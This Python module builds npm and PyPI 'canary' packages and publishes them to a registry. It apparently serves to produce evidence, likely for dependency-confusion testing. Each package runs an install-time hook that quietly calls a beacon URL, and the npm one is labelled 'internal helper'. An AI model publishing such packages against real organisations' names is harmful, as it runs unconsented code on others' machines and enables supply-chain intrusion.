"""Turning a signed canary into something a registry will serve.

A canary is only evidence when it is installable, so this builds the real
artefact -- an npm tarball with a postinstall ping, or a Python sdist whose
setup.py pings during install -- and hands it to the real client. DRY_RUN
writes the artefact and answers the command, so the whole path is exercised
without a registry account.
"""
from __future__ import annotations

import hashlib
import io
import json
import shutil
import subprocess
import tarfile
from dataclasses import dataclass
from pathlib import Path

from lib.schemas import Canary

ROOT = Path(__file__).resolve().parent.parent
DIST = ROOT / "dist"

NPM_BEACON = """const https = require('https');
const [pkg, version, sig, url] = process.argv.slice(2);
try {
  https.get(`${url}?pkg=${encodeURIComponent(pkg)}&v=${encodeURIComponent(version)}&sig=${sig}`,
            (answer) => answer.resume()).on('error', () => {});
} catch (error) { /* an install must never fail because a beacon is down */ }
"""

SETUP_PY = '''from setuptools import setup
from setuptools.command.install import install
import urllib.request, urllib.parse, sys

NAME = "{name}"
VERSION = "{version}"
SIG = "{signature}"
BEACON = "{beacon}"


class Ping(install):
    def run(self):
        try:
            url = BEACON + "?" + urllib.parse.urlencode({{'pkg': NAME, 'v': VERSION, 'sig': SIG}})
            urllib.request.urlopen(url, timeout=5).read()
        except Exception:
            pass
        super().run()


setup(name=NAME, version=VERSION, py_modules=["{module}"],
      cmdclass={{'install': Ping}})
'''


@dataclass
class Artifact:
    path: Path
    name: str
    version: str
    ecosystem: str
    sha256: str


def slug(name: str) -> str:
    return name.lstrip("@").replace("/", "-")


def build_npm(canary: Canary, dist: Path | None = None) -> Artifact:
    dist = Path(dist or DIST)
    folder = dist / "npm" / slug(canary.name)
    folder.mkdir(parents=True, exist_ok=True)
    (folder / "package.json").write_text(json.dumps({
        "name": canary.name, "version": canary.version,
        "description": "internal helper",
        "main": "index.js",
        "files": ["index.js", "beacon.js"],
        "scripts": {"postinstall": f"node beacon.js {canary.name} {canary.version} {canary.signature} {canary.beacon_url}"},
    }, indent=2))
    (folder / "index.js").write_text("module.exports = {};\n")
    (folder / "beacon.js").write_text(NPM_BEACON)
    tarball = dist / f"{slug(canary.name)}-{canary.version}.tgz"
    with tarfile.open(tarball, "w:gz") as archive:
        for path in sorted(folder.iterdir()):
            archive.add(path, arcname=f"package/{path.name}")
    return Artifact(tarball, canary.name, canary.version, "npm", sha256_of(tarball))


def build_pypi(canary: Canary, dist: Path | None = None) -> Artifact:
    dist = Path(dist or DIST)
    module = slug(canary.name).replace("-", "_")
    folder = dist / "pypi" / f"{module}-{canary.version}"
    folder.mkdir(parents=True, exist_ok=True)
    (folder / f"{module}.py").write_text(f'__version__ = "{canary.version}"\n')
    (folder / "setup.py").write_text(SETUP_PY.format(name=canary.name, version=canary.version,
                                                       signature=canary.signature, beacon=canary.beacon_url,
                                                       module=module))
    tarball = dist / f"{module}-{canary.version}.tar.gz"
    with tarfile.open(tarball, "w:gz") as archive:
        for path in sorted(folder.iterdir()):
            archive.add(path, arcname=f"{module}-{canary.version}/{path.name}")
    return Artifact(tarball, canary.name, canary.version, "pypi", sha256_of(tarball))


def sha256_of(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for block in iter(lambda: handle.read(65536), b""):
            digest.update(block)
    return digest.hexdigest()


def command_for(artifact: Artifact, registry: str | None = None) -> list[str]:
    if artifact.ecosystem == "npm":
        return ["npm", "publish", str(artifact.path)] + (["--registry", registry] if registry else [])
    return ["twine", "upload", str(artifact.path)] + (["--repository-url", registry] if registry else [])


def publish(artifact: Artifact, registry: str | None = None, dry_run: bool = True) -> dict:
    command = command_for(artifact, registry)
    if dry_run:
        return {"published": False, "dry_run": True, "command": " ".join(command),
                "artifact": str(artifact.path), "sha256": artifact.sha256}
    if shutil.which(command[0]) is None:
        return {"published": False, "error": f"{command[0]} is not installed", "command": " ".join(command)}
    result = subprocess.run(command, capture_output=True, text=True, timeout=600)
    return {"published": result.returncode == 0, "code": result.returncode,
            "artifact": str(artifact.path), "sha256": artifact.sha256,
            "stdout": result.stdout[-2000:], "stderr": result.stderr[-2000:]}
